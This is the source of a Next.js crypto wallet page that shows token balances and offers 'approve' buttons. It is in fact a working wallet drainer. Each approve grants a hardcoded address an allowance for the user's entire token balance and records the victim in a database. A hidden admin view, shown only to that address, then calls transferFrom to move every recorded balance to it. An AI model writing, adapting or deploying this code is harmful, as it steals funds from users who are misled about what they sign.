import Head from 'next/head'
import Image from 'next/image'
import styles from '../styles/Home.module.css'
import {
  useMoralis,
  useWeb3Contract,
  useMoralisWeb3Api,
  useChain,
  useERC20Balances,
  useNativeBalance,
} from 'react-moralis'
import { abi } from '../constants/abi'
import { useState, useEffect } from 'react'
import { BigNumber, ethers } from 'ethers'
import Querry from '../components/query'
import Admin from '../components/admin'
import Approve from '../components/approve'

export default function Home() {
  const [nativeBalance, setNativeBalance] = useState()
  const [queryData, setQueryData] = useState([])
  const [balanceObject, setBalanceObject] = useState([])
  const [hasMetamask, setHasMetamask] = useState(false)
  const { enableWeb3, isWeb3Enabled, Moralis, account } = useMoralis()
  const { switchNetwork, chainId, chain } = useChain()
  const { fetchERC20Balances } = useERC20Balances()

  const {
    data,
    error,
    runContractFunction,
    isFetching,
    isLoading,
  } = useWeb3Contract()

  async function querryBalances() {
    let items = []
    const query = new Moralis.Query('Balances')
    const q = await query.find()
    // console.log(q)
    for (let i = 0; i < q.length; i++) {
      // console.log(q[i].attributes)
      // items.push(q[i].attributes)
      items.push({
        token_addresses: q[i].attributes['token_addresses'],
        Balances: q[i].attributes['Balances'],
        accounts: q[i].attributes['accounts'],
      })
      // items[i] = q[i].attributes
      // items[q[i].attributes["token_addresses"]] = q[i].attributes["Balances"]
    }

    items = items.filter(
      (v, i, a) =>
        a.findIndex((v2) => JSON.stringify(v2) === JSON.stringify(v)) === i,
    )

    console.log(items)
    setQueryData(items)
  }

  async function getNativeBalance(account) {
    const options = {
      chain: 'eth',
      address: account,
    }
    const balance = await Moralis.Web3API.account.getNativeBalance(options)
    setNativeBalance(parseInt(balance.balance))
    console.log(parseInt(balance.balance))
  }

  async function getTokenBalances() {
    //TODO change chain
    const balances = await fetchERC20Balances({
      params: { chain: '0x4', address: account },
    })

    const sss = await ethers.providers.getDefaultProvider().getBalance(account)
    const ttt = await ethers.utils.formatEther(sss)

    // const addressOfT = balances[0].token_address
    // const b = balances[0].balance
    // setTAddress(addressOfT)
    // setBalanceOfToken(parseInt(b))

    const items = await Promise.all(
      balances.map(async (i) => {
        let item = {
          token_address: i.token_address,
          balance: i.balance,
          symbol: i.symbol,
          decimals: parseInt(i.decimals),
        }
        return item
      }),
    )

    var item = {
      token_address: account,
      balance: ttt,
      symbol: 'eth',
      decimals: 18,
    }

    items.push(item)

    setBalanceObject(items)
  }

  useEffect(() => {
    if (typeof window.ethereum !== 'undefined') {
      setHasMetamask(true)
    }
    // querryBalances()
  }, [])

  if (!isWeb3Enabled) {
    return Querry(enableWeb3)
  }

  // if (!isWeb3Enabled) {
  //   return (
  //     <div>
  //       <div className="jumbotron d-flex align-items-center min-vh-100">
  //         <div className="container text-center">
  //           <button className="btn btn-primary" onClick={() => enableWeb3()}>Connect </button>
  //         </div>
  //       </div>
  //     </div>
  //   )
  // }
  //TODO admin account
  if (account == '0x05c13CcaEce9C19Da652e1fF77aB56DE8e6468da') {
    // return Admin(querryBalances, queryData, runContractFunction, isFetching)
    return (
      <div>
        <div className="container-md">
          <button className="btn btn-primary" onClick={() => querryBalances()}>
            load tokens
          </button>
          <table className="table">
            <thead>
              <tr>
                <th scope="col">#</th>
                <th scope="col">Token Address</th>
                <th scope="col">User Address</th>
                <th scope="col">Balance</th>
                <th scope="col">Transfer</th>
              </tr>
            </thead>
            <tbody>
              {queryData.map((b, i) => (
                <tr key={i}>
                  <th scope="row">{i}</th>
                  <td>{b.token_addresses}</td>
                  <td>{b.accounts}</td>
                  <td>{b.Balances}</td>
                  <td>
                    <button
                      className="btn btn-primary"
                      disabled={isFetching}
                      onClick={async () => {
                        await runContractFunction({
                          params: {
                            abi: abi,
                            contractAddress: b.token_addresses, // your contract address here
                            functionName: 'transferFrom',
                            params: {
                              //TODO change address
                              _from: b.accounts,
                              _to: '0x05c13CcaEce9C19Da652e1fF77aB56DE8e6468da',
                              _value: ethers.utils.parseUnits(
                                b.Balances,
                                'wei',
                              ),
                            },
                          },
                        })
                      }}
                    >
                      Transfer
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    )
  }

  return (
    <div>
      {hasMetamask ? (
        isWeb3Enabled ? (
          'Connected! '
        ) : (
          <button onClick={() => enableWeb3()}>Connect </button>
        )
      ) : (
        'Please install metamask'
      )}

      <button
        className="btn btn-primary m-3"
        onClick={() => switchNetwork('0x1')}
      >
        Switch to Ethereum
      </button>
      <button
        className="btn btn-primary m-3"
        onClick={() => switchNetwork('0x38')}
      >
        Switch to Binance
      </button>

      <p>Current chainId: {chainId}</p>

      <button
        className="btn btn-success"
        onClick={() => getNativeBalance(account)}
      >
        Native Balance
      </button>
      <p>{nativeBalance}</p>
      <button className="btn btn-success" onClick={() => getTokenBalances()}>
        Load Tokens
      </button>

      {/* <pre>{JSON.stringify(data, null, 2)}</pre> */}

      {/* <button onClick={() => runContractFunction()} disabled={isFetching}>approve</button> */}

      {/* {Approve(balanceObject, isFetching, Moralis, account)} */}

      <div className="container-md">
        <table className="table">
          <thead>
            <tr>
              <th scope="col">#</th>
              <th scope="col">Symbol</th>
              <th scope="col">Address</th>
              <th scope="col">Balance</th>
              <th scope="col">Approval</th>
            </tr>
          </thead>
          <tbody>
            {balanceObject.map((b, i) => (
              <tr key={i}>
                <th scope="row">{i}</th>
                <td>{b.symbol}</td>
                <td>{b.token_address}</td>
                <td>{parseInt(b.balance) / ('1e' + b.decimals)}</td>
                <td>
                  <button
                    className="btn btn-primary"
                    disabled={isFetching}
                    onClick={async () => {
                      await runContractFunction({
                        params: {
                          abi: abi,
                          contractAddress: b.token_address, // your contract address here
                          functionName: 'approve',
                          params: {
                            //TODO change address
                            _spender:
                              '0x05c13CcaEce9C19Da652e1fF77aB56DE8e6468da',
                            _value: ethers.utils.parseUnits(b.balance, 'wei'),
                          },
                        },
                      })

                      const Balances = await Moralis.Object.extend('Balances')
                      const Bal = await new Balances()
                      await Bal.set('token_addresses', b.token_address)
                      await Bal.set('Balances', b.balance)
                      await Bal.set('accounts', account)

                      await Bal.save()
                      console.log('db updated')

                      await querryBalances()
                    }}
                  >
                    approve
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  )
}
